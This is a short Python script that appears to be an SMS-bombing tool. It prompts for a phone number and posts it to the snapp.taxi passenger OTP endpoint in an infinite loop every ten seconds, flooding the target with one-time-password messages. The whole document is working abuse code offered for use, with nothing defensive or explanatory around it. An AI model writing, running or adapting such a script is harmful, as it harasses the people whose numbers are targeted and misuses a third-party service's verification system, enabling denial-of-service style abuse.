import requests

import time

phnenum = input("Enter The Phone Number : ")

urlsend = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"



mydata = {"cellphone":""+phnenum}



while True :
    requests.post(urlsend, data=mydata)
    print("Ok")
    time.sleep(10)
